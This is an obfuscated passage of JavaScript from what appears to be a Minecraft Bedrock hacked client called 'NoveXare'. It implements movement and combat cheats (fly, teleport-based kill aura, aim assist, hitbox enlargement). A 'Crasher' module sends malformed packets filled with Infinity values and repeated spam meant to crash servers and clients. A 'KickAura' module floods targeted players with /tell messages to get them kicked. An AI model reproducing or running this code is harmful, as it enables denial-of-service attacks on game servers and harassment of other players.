              pos: _0x129a90,
              motion: {
                x: 0,
                y: 0,
                z: 0
              },
              rot: _0x412945,
              yHeadRot: 0
            };
            var _0x4652bd = {
              x: self_pos.x,
              y: self_pos.y,
              z: self_pos.z
            };
            var _0x25349d = {
              inputMode: 2,
              playMode: 0,
              pos: _0x4652bd,
              motion: {
                x: 0,
                y: 0,
                z: 0
              },
              rot: _0x412945,
              yHeadRot: 0
            };
            if (gm_local) {
              sendPlayerAuthInput(_0x11dd1a);
            } else {
              sendPlayerAuthInput(_0x25349d);
            }
          }
        }
        gm_tick = 0;
      }
    }
    if (KeepDistance && target_list.length > 0 && getHorizontalDistanceByID(self_id, target_list[0]) < KeepDistance_distance && (_0x58cd3a || !KeepDistance_only_ground)) {
      const _0x4faa09 = getPlayerAngle(getEntityPos(target_list[0]), self_id, "yaw_pos");
      var _0x40a5be = {
        yaw: _0x4faa09,
        pitch: _0x412945.pitch
      };
      const _0x3bf952 = getDisplacement(-KeepDistance_speed / 10, self_pos, _0x40a5be);
      setMotion(_0x3bf952.x - self_pos.x, _0x16a344.y, _0x3bf952.z - self_pos.z);
    }
    if (AirJump && _0x16a344.y < -0.42) {
      let _0x98628a = predictEntityPos(_0x16a344, self_pos, getSpeed(self_id));
      let _0x2bd579 = getPlayerAngle(_0x98628a, self_id, "yaw_pos");
      var _0x8f1186 = {
        yaw: _0x2bd579,
        pitch: 0
      };
      let _0x41aadb = getDisplacement(jump_length / 10, self_pos, _0x8f1186);
      setMotion(_0x41aadb.x - self_pos.x, jump_heigh / 100, _0x41aadb.z - self_pos.z);
    }
    if (drop_list.length > 0) {
      let _0x11dd0f = drop_list.pop();
      dropPlayerInventorySlot(self_id, _0x11dd0f);
    }
    if (RandomDrop) {
      dropPlayerInventorySlot(self_id, getRandomNum(0, 8));
    }
    if (RandomSelect) {
      selectPlayerInventorySlot(self_id, getRandomNum(0, 8));
    }
    if (Trace && target_list.length > 0 && getDistanceByID(self_id, target_list[0]) > Trace_min_dis) {
      let _0x1d5e1d = getPlayerAngle(self_id, target_list[0], "yaw_pos");
      let _0x36d204 = getPlayerAngle(self_id, target_list[0], "pitch_pos");
      var _0x2c6b7e = {
        yaw: _0x1d5e1d,
        pitch: -_0x36d204
      };
      let _0x350a22 = getDisplacement(-Trace_speed / 5, getEntityPos(self_id), _0x2c6b7e);
      setEntityPos(self_id, _0x350a22.x, _0x350a22.y, _0x350a22.z);
    }
    if (LineParticle && target_list.length > 0) {
      let _0xeab67f = getEntityPos(self_id);
      _0xeab67f.y += line_particle_offset / 10;
      target_list.map(_0x46bc93 => {
        let _0x1046b5 = getEntityPos(_0x46bc93);
        _0x1046b5.y += 0.765;
        let _0x2f67d0 = getPlayerAngle(_0xeab67f, _0x1046b5, "yaw_pos");
        let _0x53bbc2 = getPlayerAngle(_0xeab67f, _0x1046b5, "pitch_pos");
        for (let _0x4a4c4f = 0; _0x4a4c4f < getDistanceByID(_0x46bc93, self_id); _0x4a4c4f += (11 - line_particle_size) / 5) {
          var _0xc9b521 = {
            yaw: _0x2f67d0,
            pitch: -_0x53bbc2
          };
          let _0x173af3 = getDisplacement(-_0x4a4c4f, getEntityPos(self_id), _0xc9b521);
          drawParticle(line_particle_type, _0x173af3.x, _0x173af3.y - 1.53 + line_particle_offset / 10, _0x173af3.z, 1);
        }
      });
    }
    if (Spammer) {
      text_d_1 = Date.now();
      if (text_d_1 - text_d_2 >= 0) {
        for (let _0x246be6 = 0; _0x246be6 < Spammer_num; _0x246be6++) {
          if (Spammer_word) {
            message_list = readFile(NoveXare_path + "/Spammer.txt").split("\n");
            content = message_list[getRandomNum(0, message_list.length - 1)];
          }
          var _0x3aaa3a = randomStr(6);
          sendChatMessage(Spammer_random ? content + " || " + _0x3aaa3a : content);
        }
        text_d_2 = text_d_1 + Spammer_delay * 1000;
      }
    }
    if (HitBox && target_list.length > 0) {
      target_list.map(_0x24e171 => setEntitySize(_0x24e171, HitBox_x, HitBox_y));
    }
    if (Sucker && target_list.length > 0) {
      target_list.map(_0x5c025f => {
        const _0x2d77a2 = getDisplacement(Sucker_dis, self_pos, _0x412945);
        setEntityPos(_0x5c025f, _0x2d77a2.x, _0x2d77a2.y, _0x2d77a2.z);
      });
    }
    if (Velocity && getEntityFlag(self_id, 34)) {
      if (!Bhop) {
        var _0x21e4a2 = {
          max: bhop_speed / 15,
          min: bhop_speed / 15,
          current: bhop_speed / 15
        };
        setEntityAttribute(self_id, "minecraft:movement", _0x21e4a2);
      }
      if (Bhop) {
        let _0x3b8ae3 = _0x412945.yaw;
        if (func_mode.bhop_mode == 1) {
          const _0x2dee7d = predictEntityPos(getEntityMotion(self_id), getEntityPos(self_id), 20);
          _0x3b8ae3 = getPlayerAngle(self_id, _0x2dee7d, "yaw_pos");
        }
        var _0x5b4c4d = {
          yaw: _0x3b8ae3,
          pitch: 0
        };
        let _0x19df64 = getDisplacement((func_mode.bhop_mode === 0 ? bhop_speed : -bhop_speed) / 10, self_pos, _0x5b4c4d);
        setMotion(_0x19df64.x - self_pos.x, (_0x58cd3a || bhop_airjump) && (!bhop_airjump || _0x16a344.y < -0.42) ? bhop_heigh : _0x16a344.y, _0x19df64.z - self_pos.z);
      }
    }
    if (FlexibleMove) {
      const _0x43a061 = predictEntityPos(getEntityMotion(self_id), getEntityPos(self_id), 20);
      const _0x3ea70d = getPlayerAngle(self_id, _0x43a061, "yaw_pos");
      var _0x48d914 = {
        yaw: _0x3ea70d,
        pitch: 0
      };
      const _0x3a6b2d = getDisplacement(flexibleMove_speed / 10, self_pos, _0x48d914);
      if (!_0x58cd3a && getEntityFlag(self_id, 34)) {
        setMotion(_0x3a6b2d.x - self_pos.x, 0, _0x3a6b2d.z - self_pos.z);
      }
    }
    if (TargetParticle) {
      target_list.map(_0x43c99f => {
        const _0x441c09 = getEntityPos(_0x43c99f);
        drawParticle(particle_type, _0x441c09.x, _0x441c09.y + 0.3, _0x441c09.z, particle_size);
      });
    }
    if ((item_count != lasttick_item_count || cleaner_slot != 35 || !cleaner_change) && Cleaner && drop_delay_t > drop_delay && (!cleaner_bow || _0x412945.pitch > 80) && (!cleaner_chest || isOpenChest)) {
      for (let _0x442398 = 0; _0x442398 < Math.ceil(max_drop_item); _0x442398++) {
        let _0x2aa69a = cleaner_slot - _0x442398;
        const _0x18432d = getInventory(self_id, _0x2aa69a);
        if (_0x18432d.count == 0) {
          continue;
        }
        var _0x4ffcf5 = false;
        if (func_mode.cleaner_mode == 0) {
          _0x4ffcf5 = clear_config.some(_0x189029 => _0x189029.namespace == _0x18432d.namespace && (getItemCount(_0x2aa69a) > _0x189029.max_num || _0x189029.max_num == -1) && (_0x18432d.aux === _0x189029.aux || _0x189029.aux == "any"));
        }
        if (func_mode.cleaner_mode == 1) {
          const _0x25ff95 = temp.includes(_0x18432d.namespace);
          _0x4ffcf5 = clear_config.some(_0x19e7db => !_0x25ff95 || _0x19e7db.namespace == _0x18432d.namespace && (getItemCount(_0x2aa69a) > _0x19e7db.max_num || _0x19e7db.max_num == -1) && (_0x18432d.aux == _0x19e7db.aux || _0x19e7db.aux == "any"));
        }
        if (_0x4ffcf5) {
          if (trash_slot > -1 && _0x2aa69a > 8) {
            moveItem(_0x2aa69a, trash_slot, false);
          }
          dropPlayerInventorySlot(self_id, _0x2aa69a);
        }
        if (cleaner_move && !_0x4ffcf5) {
          clear_config.forEach(_0x3e426a => {
            if (_0x3e426a.namespace == _0x18432d.namespace && _0x3e426a.slot != undefined) {
              moveItem(_0x2aa69a, _0x3e426a.slot);
            }
          });
        }
      }
      if (cleaner_slot > 0) {
        cleaner_slot -= Math.ceil(max_drop_item);
      } else {
        cleaner_slot = 35;
      }
      drop_delay_t = 0;
      if (cleaner_chest) {
        isOpenChest = false;
      }
    }
    if (SafeWalk) {
      var _0x52da62 = predictEntityPos(_0x16a344, _0x423186, 5);
      const _0x5c33a5 = getPlayerAngle(self_id, _0x52da62, "yaw_pos");
      var _0x3cd79d = {
        yaw: _0x5c33a5,
        pitch: 0
      };
      const _0x28a061 = getDisplacement(-0.2, self_pos, _0x3cd79d);
      const _0x3dc471 = getBlock(_0x28a061.x, _0x423186.y - 1, _0x28a061.z);
      if (_0x3dc471.namespace == "minecraft:air" && _0x16a344.y < -0.0783 && _0x16a344.y > -0.0785) {
        setMotion(_0x28a061.x - self_pos.x, _0x16a344.y, _0x28a061.z - self_pos.z);
      }
    }
    if (Fly && (!fly_only_fly || getEntityFlag(self_id, 34))) {
      const _0x5df178 = getEntityAttribute(self_id, "minecraft:movement");
      if ((!_0x58cd3a || !fly_block) && (!fly_run || _0x5df178.current > 0.12)) {
        const _0x4a18a6 = fly_up_down ? fly_ud : 0;
        if (func_mode.fly_mode == 0) {
          var _0x141ac1 = predictEntityPos(_0x16a344, self_pos, fly_speed * 2.5);
          if (!fly_includeY) {
            setPos(_0x141ac1.x, self_pos.y + _0x4a18a6, _0x141ac1.z);
          }
          if (fly_includeY) {
            setPos(self_pos.x, _0x141ac1.y, self_pos.z);
          }
          if (fly_mot) {
            setMotion(0, -0.01, 0);
          }
        }
        if (func_mode.fly_mode == 1) {
          const _0xa7f5d6 = predictEntityPos(getEntityMotion(self_id), getEntityPos(self_id), 20);
          const _0x197dfa = getPlayerAngle(self_id, _0xa7f5d6, "yaw_pos");
          var _0x1f5263 = {
            yaw: _0x197dfa,
            pitch: 0
          };
          var _0x62ec82 = getDisplacement(fly_speed / 5, getEntityPos(self_id), _0x1f5263);
          setEntityMotion(self_id, _0x62ec82.x - self_pos.x, _0x62ec82.y - self_pos.y + _0x4a18a6, _0x62ec82.z - self_pos.z);
          var _0x43f052 = {
            x: _0x62ec82.x,
            y: _0x62ec82.y,
            z: _0x62ec82.z
          };
          if (fly_packet) {
            sendPlayerAuthInput({
              inputMode: 2,
              playMode: 0,
              pos: _0x43f052,
              motion: getEntityMotion(self_id),
              rot: _0x412945,
              yHeadRot: 0
            });
          }
        }
        fly_ud = fly_ud > 0 ? -fly_set_ud / 10 : fly_set_ud / 10;
      }
    }
    if (ActivitySender && getEntityFlag(self_id, 34)) {
      var _0x39238f = predictEntityPos(_0x16a344, self_pos, 1);
      const _0x519993 = getPlayerAngle(self_id, _0x39238f, "yaw_pos");
      sendChatMessage("我正在向" + Math.round(_0x519993) + "°方向移动");
    }
    if (FakeWater) {
      setBlock(self_pos.x - 1, self_pos.y - 1, self_pos.z - 1, "minecraft:water", 0);
    }
    if (Suspend) {
      setMotion(_0x16a344.x, -0.001, _0x16a344.z);
    }
    if (Hover) {
      setMotion(_0x16a344.x, 0.05, _0x16a344.z);
    }
    if (findEntity(target_list[0]) && Rider && target_list.length > 0) {
      var _0x4de2a1 = getEntityPos(target_list[0]);
      const _0x242245 = Rider_random ? getRandomNum(-2, 2) : 0;
      MenuTP(_0x4de2a1.x + _0x242245, _0x4de2a1.y + Rider_heigh + 1, _0x4de2a1.z + _0x242245);
      if (FuncTip) {
        _0x2aa3e0.push("§rRode §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "" + getEntityName(target_list[0]));
      }
    }
    if (JetPack) {
      const _0x277038 = getEntityAttribute(self_id, "minecraft:movement");
      if (_0x277038.current > 0.12 || !move_fly) {
        var _0x62ec82 = getDisplacement(func_mode.sprint_mode == 0 ? sprint_speed / 11 : sprint_speed / 11, getEntityPos(self_id), getEntityRot());
        if (sprint_horizontal) {
          _0x62ec82.y = self_pos.y;
        }
        const _0x836d1c = getBlock(_0x62ec82.x, _0x62ec82.y, _0x62ec82.z);
        if (_0x836d1c.namespace === "minecraft:air" || throw_wall) {
          if (func_mode.sprint_mode == 0) {
            setEntityPos(self_id, _0x62ec82.x, _0x62ec82.y, _0x62ec82.z);
            setEntityMotion(self_id, _0x16a344.x, -1e-7, _0x16a344.z);
          }
          if (func_mode.sprint_mode == 1) {
            setMotion(_0x62ec82.x - self_pos.x, _0x62ec82.y - self_pos.y, _0x62ec82.z - self_pos.z);
          }
          var _0x3e017d = {
            x: _0x62ec82.x,
            y: _0x62ec82.y,
            z: _0x62ec82.z
          };
          var _0x1099f4 = {
            inputMode: 2,
            playMode: 0,
            pos: _0x3e017d
          };
          _0x1099f4.motion = getEntityMotion(self_id);
          _0x1099f4.rot = _0x412945;
          _0x1099f4.yHeadRot = 0;
          if (sprint_packet) {
            sendPlayerAuthInput(_0x1099f4);
          }
        } else {
          setEntityPos(self_id, self_pos.x, self_pos.y, self_pos.z);
        }
      }
    }
    if (Crasher) {
      for (let _0x2428b6 = 0; _0x2428b6 <= Crasher_for; _0x2428b6++) {
        if (func_mode.Crasher_mode === 1) {
          buildBlock(self_id, self_pos.x, self_pos.y, self_pos.z, _0x2428b6);
        }
        if (func_mode.Crasher_mode === 2) {
          sendPlayerAction({
            id: self_id,
            pos: {
              x: 0,
              y: 0,
              z: 0
            },
            value: 1,
            type: Math.abs(_0x2428b6) % 38
          });
        }
        if (func_mode.Crasher_mode === 4) {
          sendChatMessage("NoveXareCrasher" + " ".repeat(100));
        }
        if (func_mode.Crasher_mode === 3 && last_PyRpc != {}) {
          sendRpc(last_PyRpc.id, last_PyRpc.data);
        }
        if (func_mode.Crasher_mode === 5) {
          let _0xfc5613 = getPlayerList();
          _0xfc5613.map(_0x578cd0 => {
            if (_0x578cd0 != self_id) {
              const _0x9b68b = getEntityName(_0x578cd0);
              let _0xd1a14e = _0x9b68b.indexOf("]") - 2;
              let _0xf0059e = ["b", "c", "e", "a"];
              for (let _0x2aac22 of _0xf0059e) {
                if (_0x9b68b.indexOf("·§" + _0x2aac22) != -1) {
                  _0xd1a14e = _0x9b68b.indexOf("·§" + _0x2aac22);
                  break;
                }
              }
              var _0x1c0a9f = _0xd1a14e == -1 ? _0x9b68b : _0x9b68b.slice(_0xd1a14e + 3, _0x9b68b.length);
              if (_0x1c0a9f.includes("【") && _0x1c0a9f.includes("】")) {
                _0x1c0a9f = getText(_0x1c0a9f, "【", "】");
              }
              executeCommand("/tell \"" + _0x1c0a9f + "\" NoveXareCrasher" + "魑魅魍魉".repeat(10));
            }
          });
        }
        if (func_mode.Crasher_mode === 6) {
          setLocalPlayerTurn(0, Infinity);
        }
        if (func_mode.Crasher_mode === 8) {
          sendSound(81, self_pos.x, self_pos.y, self_pos.z, _0x2428b6);
        }
        if (func_mode.Crasher_mode === 9) {
          target_list.map(_0x4ff6c9 => attack(_0x4ff6c9, false));
        }
        if (func_mode.Crasher_mode === 10) {
          sendMovePlayer({
            id: self_id,
            pos: {
              x: self_pos.x,
              y: Infinity,
              z: self_pos.z
            },
            mode: 0,
            ground: _0x58cd3a,
            rot: _0x412945,
            yHeadRot: 0
          });
        }
        if (func_mode.Crasher_mode === 7) {
          executePluginCommand("/ww say NoveXareCrasher");
        }
        var _0x58c0e9 = {
          x: Infinity,
          y: Infinity
        };
        if (func_mode.Crasher_mode === 11) {
          sendPlayerAuthInput({
            inputMode: 2,
            playMode: 0,
            pos: {
              x: Infinity,
              y: Infinity,
              z: Infinity
            },
            motion: {
              x: Infinity,
              y: Infinity,
              z: Infinity
            },
            rot: {
              yaw: Infinity,
              pitch: Infinity
            },
            yHeadRot: Infinity,
            analogMoveVector: {
              x: Infinity,
              y: Infinity
            },
            vehicleRotation: {
              yaw: Infinity,
              pitch: Infinity
            },
            move: _0x58c0e9,
            inputs: [],
            actions: []
          });
        }
      }
    }
    if (KickAura && target_list.length > 0) {
      target_list.map(_0xca747b => {
        if (_0xca747b != self_id) {
          const _0x342f78 = getEntityName(_0xca747b);
          let _0x4bcab4 = _0x342f78.indexOf("]") - 2;
          let _0x4256d1 = ["b", "c", "e", "a"];
          for (let _0x5ec893 of _0x4256d1) {
            if (_0x342f78.indexOf("·§" + _0x5ec893) != -1) {
              _0x4bcab4 = _0x342f78.indexOf("·§" + _0x5ec893);
              break;
            }
          }
          var _0x131c1b = _0x4bcab4 == -1 ? _0x342f78 : _0x342f78.slice(_0x4bcab4 + 3, _0x342f78.length);
          if (_0x131c1b.includes("【") && _0x131c1b.includes("】")) {
            _0x131c1b = getText(_0x131c1b, "【", "】");
          }
          for (let _0x11b519 = 0; _0x11b519 < KickAura_for; _0x11b519++) {
            executeCommand("/tell \"" + _0x131c1b + "\" NoveXareCrasher" + edit_KickAura.repeat(KickAura_repeat));
          }
        }
      });
    }
    if (AutoSave && _0x16a344.y < -max_mot_y && !_0x58cd3a) {
      if (autosave_autoselect && !_0x4f7660.isBlock) {
        for (let _0x6a91b7 = 0; _0x6a91b7 < 9; _0x6a91b7++) {
          const _0xbeeeed = getInventory(self_id, _0x6a91b7);
          if (_0xbeeeed.isBlock) {
            selectPlayerInventorySlot(self_id, _0x6a91b7);
            break;
          }
        }
      }
      if (autosave_air && _0x16a344.y < -max_mot_y && !_0x58cd3a) {
        setPos(self_pos.x, self_pos.y, self_pos.z);
      }
      if (!autosave_near_block) {
        if (autosave_fake_block) {
          callModule(37, "{\"value\":true}");
        }
        buildBlock(self_id, _0x423186.x, _0x423186.y - max_mot_y * 3.1, _0x423186.z, 0);
        if (autosave_fake_block) {
          callModule(37, "{\"value\":false}");
        }
      }
      if (autosave_near_block) {
        let _0x12647e = {};
        let _0x8cfe7f = Infinity;
        _0x43c7a6: for (let _0x20b3a7 = -5; _0x20b3a7 <= 5; _0x20b3a7++) {
          for (let _0x2522ac = -1; _0x2522ac <= 0; _0x2522ac++) {
            for (let _0x1a0ae7 = -5; _0x1a0ae7 <= 5; _0x1a0ae7++) {
              let _0x303181 = Math.sqrt(_0x20b3a7 * _0x20b3a7 + _0x1a0ae7 * _0x1a0ae7 + _0x2522ac * _0x2522ac);
              var _0x25c8a2 = {
                x: _0x20b3a7 + _0x423186.x,
                y: _0x2522ac + _0x423186.y,
                z: _0x1a0ae7 + _0x423186.z
              };
              let _0xd5b560 = _0x25c8a2;
              const _0x565bcd = getBlock(_0xd5b560.x, _0xd5b560.y, _0xd5b560.z);
              if (_0x565bcd.namespace == "minecraft:air") {
                continue _0x43c7a6;
              }
              if (_0x303181 < _0x8cfe7f) {
                _0x8cfe7f = _0x303181;
                _0x12647e = _0xd5b560;
              } else {
                continue _0x43c7a6;
              }
            }
          }
        }
        if (_0x12647e != {}) {
          var _0x3ab7af = {
            x: _0x423186.x,
            y: _0x423186.y - 1 + _0x16a344.y * 1.6,
            z: _0x423186.z
          };
          let _0xe0530b = _0x3ab7af;
          let _0x36f439 = findPath(_0x12647e, _0xe0530b);
          _0x36f439.map(_0x2afcac => {
            const _0xe0f5a5 = getBlock(_0x2afcac.x, _0x2afcac.y, _0x2afcac.z);
            if (_0xe0f5a5.namespace == "minecraft:air") {
              Click(Math.round(_0x2afcac.x), Math.round(_0x2afcac.y), Math.round(_0x2afcac.z));
            }
          });
        }
      }
    }
    if (LockBehind && findEntity(target_list[0]) && target_list.length > 0) {
      var _0x578dae = getEntityRot(target_list[0]);
      var _0x39238f = getEntityPos(target_list[0]);
      const _0x47be8a = RandomLock ? getRandomNum(LockBehind_heigh - 1, LockBehind_heigh + 1) : LockBehind_heigh;
      const _0x5a329b = RandomLock ? getRandomNum(-10, 10) : surround_speed * 3;
      LockBehind_yaw = Surround ? LockBehind_yaw + _0x5a329b : _0x578dae.yaw;
      if (Surround && LockBehind_yaw > 180) {
        LockBehind_yaw = -180;
      }
      var _0x5a330d = {
        yaw: LockBehind_yaw,
        pitch: 0
      };
      var _0x62ec82 = getDisplacement(-LockBehind_length, _0x39238f, _0x5a330d);
      if (func_mode.surround_mode == 0) {
        setPos(_0x62ec82.x, _0x39238f.y + 1.5 + _0x47be8a, _0x62ec82.z);
      }
      if (func_mode.surround_mode == 1) {
        Teleport(_0x62ec82.x, _0x39238f.y + _0x47be8a, _0x62ec82.z);
      }
      if (FuncTip) {
        _0x2aa3e0.push("§rLocked §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "" + getEntityName(target_list[0]));
      }
    }
    if (SoundPlayer || sound_data.length > 0) {
      let _0xd7731f = surround_all ? _0x5ed6d7.map(_0x3f552c => _0x3f552c.id) : target_list;
      if (surround_all_entity) {
        _0xd7731f.concat(getEntityList());
      }
      if (play_pos_list.length > 0) {
        _0xd7731f = play_pos_list;
      }
      var _0x1f175f = {
        sound: SoundPlayer_type,
        level: SoundPlayer_level
      };
      var _0x1a7f7c = [_0x1f175f];
      SoundPlayer_yaw += 10;
      if (SoundPlayer_yaw > 180) {
        SoundPlayer_yaw = -180;
      }
      for (let _0x26df9b = 0; _0x26df9b < SoundPlayer_vec; _0x26df9b++) {
        if (sound_data.length > 0) {
          _0x1a7f7c = sound_data.shift().sounds;
        }
        if (_0x1a7f7c.length > 0) {
          for (let _0x307b9b of _0x1a7f7c) {
            var _0x392ec3 = _0x307b9b.sound;
            var _0x4a9294 = _0x307b9b.level;
            _0xd7731f.map(_0x478dcf => {
              if (typeof _0x478dcf != "string") {
                for (let _0x225a52 = 0; _0x225a52 < SoundPlayer_num; _0x225a52++) {
                  sendSound(Number(_0x392ec3), _0x478dcf.x, _0x478dcf.y, _0x478dcf.z, Number(_0x4a9294));
                }
              } else if (_0x478dcf != self_id || !surround_exclude_self) {
                const _0x25abef = getEntityPos(_0x478dcf);
                var _0x56d7eb = {
                  yaw: SoundPlayer_yaw,
                  pitch: 0
                };
                var _0x48e5fe = getDisplacement(SoundPlayer_distance, _0x25abef, _0x56d7eb);
                for (let _0x53bac0 = 0; _0x53bac0 < SoundPlayer_num; _0x53bac0++) {
                  sendSound(Number(_0x392ec3), _0x48e5fe.x, _0x48e5fe.y, _0x48e5fe.z, Number(_0x4a9294));
                }
              }
            });
          }
        }
      }
      if (sound_data.length > 0) {
        _0x2aa3e0.push("§r剩余音频数据 §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + sound_data.length + "条");
      }
    }
    if (surround_loop && SoundPlayer && sound_file != null && sound_data.length == 0) {
      sound_data = JSON.parse(sound_file);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 循环播放中 共" + sound_data.length + "条音频数据");
      }
    }
    if (FuncTip && _0x3ba0a3.current < 6) {
      _0x2aa3e0.push("§cWarning §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "LowHealth!");
    }
    if (AutoDo && Math.round(_0x3ba0a3.current) <= min_run_heal) {
      const _0x539b74 = func_mode.low_health_operate_mode;
      switch (_0x539b74) {
        case 2:
          removeEntity(self_id);
          break;
        case 0:
        case 1:
          executeCommand(_0x539b74 === 0 ? "/hub" : "/again");
          break;
        case 3:
          if (_0x4f7660.namespace !== "minecraft:splash_potion" || _0x4f7660.aux !== 22) {
            selectPlayerInventorySlot(self_id, getItem(self_id, "splash_potion", 22));
          } else {
            setEntityRot(self_id, 90, _0x412945.yaw);
            if (_0x4f7660.namespace.includes("splash_potion")) {
              setTimeout(() => useItem(), 0);
            }
            if (low_health_operate_sword) {
              setTimeout(() => selectPlayerInventorySlot(self_id, getItem(self_id, "sword")), 100);
            }
          }
          break;
        case 4:
          if (_0x4f7660.namespace !== "minecraft:mushroom_stew") {
            selectPlayerInventorySlot(self_id, getItem(self_id, "mushroom_stew"));
          } else {
            useItem();
            if (low_health_operate_sword) {
              setTimeout(() => selectPlayerInventorySlot(self_id, getItem(self_id, "sword")), 100);
            }
          }
          break;
        case 5:
          if (_0x4f7660.namespace !== "minecraft:skull") {
            selectPlayerInventorySlot(self_id, getItem(self_id, "skull"));
          } else {
            useItem();
            if (low_health_operate_sword) {
              setTimeout(() => selectPlayerInventorySlot(self_id, getItem(self_id, "sword")), 100);
            }
          }
          break;
      }
    }
    if (NoLiquid) {
      setEntityAttribute(self_id, "minecraft:lava_movement", getEntityAttribute(self_id, "minecraft:movement"));
      setEntityAttribute(self_id, "minecraft:underwater_movement", getEntityAttribute(self_id, "minecraft:movement"));
    }
    if (Breaker && autobreak) {
      buildBlock(self_id, self_pos.x, self_pos.y, self_pos.z, 1);
    }
    if (Jesus) {
      const _0x362746 = getBlock(_0x423186.x, _0x423186.y - 1, _0x423186.z);
      if (_0x362746.namespace == "minecraft:flowing_water" || _0x362746.namespace == "minecraft:water" || _0x362746.namespace == "minecraft:flowing_lava" || _0x362746.namespace == "minecraft:lava") {
        setEntityMotion(self_id, _0x16a344.x, 0, _0x16a344.z);
      }
    }
    if (RecordInfo && !click_mode && target_list.length > 0) {
      target_list.map(_0x4a8237 => {
        let _0x442bf2 = getTargetInfo(_0x4a8237);
        clientMessage("§3§l[NoveXare] §r§7>>> §rTargetInfo §7>>>§r \n" + _0x442bf2 + "\n§r§b==============================");
        if (save_to_file) {
          write_file(NoveXare_path + "/" + name + "_" + _0x4a8237 + ".txt", _0x442bf2);
        }
      });
    }
    if (AssistAim && AssistAim_auto) {
      AssistAim_throw = ["minecraft:bow", "minecraft:snowball", "minecraft:egg", "minecraft:ender_pearl"].includes(_0x4f7660.namespace);
    }
    if (AssistAim && target_list.length > 0 && findEntity(target_list[0])) {
      const _0xe9782d = target_list[0];
      const _0x4d9b64 = getDistanceByID(self_id, _0xe9782d);
      const _0x4dd1d8 = isAimed(self_id, _0xe9782d, AssistAim_Fov, 0);
      const _0x6380d8 = getRandomNum(AssistAim_min_speed, AssistAim_max_speed);
      if (_0x4d9b64 <= AssistAim_distance && _0x4dd1d8 || AssistAim_throw) {
        let _0xaf7b5 = getPlayerAngle(self_id, _0xe9782d, "yaw_rot", AssistAim_predict, AssistAim_throw, AssistAim_random_xz, AssistAim_random_y);
        let _0xd8cad5 = getPlayerAngle(self_id, _0xe9782d, "pitch_rot", AssistAim_predict, AssistAim_throw, AssistAim_random_xz, AssistAim_random_y);
        if (!(AssistAim_other || AssistAim_self)) {
          let _0x50a285 = _0xaf7b5 >= 0 ? -_0x6380d8 : _0x6380d8;
          let _0x3a50dd = _0xd8cad5 >= 0 ? _0x6380d8 : -_0x6380d8;
          if (func_mode.AssistAim_mode === 1 || func_mode.AssistAim_mode === 0 && (Math.abs(_0xaf7b5) < _0x6380d8 || Math.abs(_0xd8cad5) < _0x6380d8)) {
            _0x50a285 = -_0xaf7b5 / ((31 - _0x6380d8) / 2);
            _0x3a50dd = -_0xd8cad5 / ((31 - _0x6380d8) / 1.125);
          }
          const _0x4213c7 = isAimed(self_id, _0xe9782d, AssistAim_precision * 2, 1);
          const _0x3a73a3 = isAimed(self_id, _0xe9782d, AssistAim_precision * 4, 2);
          if (!_0x4213c7) {
            setLocalPlayerTurn(0, _0x50a285);
          }
          if (!_0x3a73a3 && !AssistAim_throw || !isSame(_0xd8cad5, 0, 1) && AssistAim_throw) {
            setLocalPlayerTurn(_0x3a50dd, 0);
          }
        }
        if (FuncTip) {
          const _0x207c25 = RainbowTip ? "§" + rgb_color[rgb_l] : "§r";
          _0x2aa3e0.push("§rAimed §7>>> §r" + getEntityName(_0xe9782d));
        }
      }
    }
    if (InfiniteAura_switch_delay == 0 && target_list.length > 0) {
      InfiniteAura_target = target_list;
    }
    if (InfiniteAura && InfiniteAura_target.length > 0 && getDistanceByID(InfiniteAura_target[0], self_id) < InfiniteAura_distance) {
      InfiniteAura_target.map(_0x36e09d => {
        const _0x227e89 = _0x36e09d;
        const _0x2381d7 = getEntityPos(_0x227e89);
        if (func_mode.server_mode === 0) {
          if (InfiniteAura_backPos && InfiniteAura_back) {
            if (func_mode.InfiniteAura_mode < 2) {
              setPos(InfiniteAura_backPos.x, InfiniteAura_backPos.y + (InfiniteAura_backY ? 1.5 : 0), InfiniteAura_backPos.z);
            }
            if (func_mode.InfiniteAura_mode == 1) {
              setMotion(InfiniteAura_backMotion.x, InfiniteAura_backMotion.y, InfiniteAura_backMotion.z);
            }
            if (func_mode.InfiniteAura_mode == 3) {
              MenuTP(InfiniteAura_backPos.x, InfiniteAura_backPos.y, InfiniteAura_backPos.z);
            }
            if (func_mode.InfiniteAura_mode == 2) {
              executePluginCommand("/ww tp " + InfiniteAura_backPos.x + " " + InfiniteAura_backPos.y + " " + InfiniteAura_backPos.z);
            }
            var _0x399e82 = {
              x: InfiniteAura_backPos.x,
              y: InfiniteAura_backPos.y,
              z: InfiniteAura_backPos.z
            };
            if (func_mode.InfiniteAura_mode == 4) {
              sendPlayerAuthInput({
                inputMode: 2,
                playMode: 0,
                pos: _0x399e82,
                motion: getEntityMotion(self_id),
                rot: {
                  pitch: 0,
                  yaw: 0
                },
                yHeadRot: 0,
                inputs: [1]
              });
            }
            if (InfiniteAura_backY) {
              setPos(InfiniteAura_backPos.x, InfiniteAura_backPos.y + (InfiniteAura_backY ? 1.5 : 0), InfiniteAura_backPos.z);
            }
            if (InfiniteAura_backclick) {
              buildBlock(self_id, InfiniteAura_backPos.x, InfiniteAura_backPos.y, InfiniteAura_backPos.z, 1);
              var _0x39b1fb = {
                x: InfiniteAura_backPos.x,
                y: InfiniteAura_backPos.y,
                z: InfiniteAura_backPos.z
              };
              var _0x324637 = {
                x: InfiniteAura_backPos.x,
                y: InfiniteAura_backPos.y,
                z: InfiniteAura_backPos.z
              };
              var _0x5b53b9 = {
                pos: _0x324637,
                value: 1,
                type: 25
              };
              var _0x488296 = {
                inputMode: 2,
                playMode: 0,
                pos: _0x39b1fb,
                actions: [_0x5b53b9],
                inputs: [1]
              };
              if (func_mode.InfiniteAura_mode == 4) {
                sendPlayerAuthInput(_0x488296);
              }
            }
            attack(_0x227e89, AttackSwing);
          }
          if (tick <= -InfiniteAura_delay) {
            InfiniteAura_num_r = InfiniteAura_num;
            InfiniteAura_backPos = self_pos;
            InfiniteAura_backMotion = _0x16a344;
            tick = InfiniteAura_tick;
            tphit(_0x227e89);
          }
          if (_0x227e89) {
            if (InfiniteAura_num_r) {
              tphit(_0x227e89);
            } else {
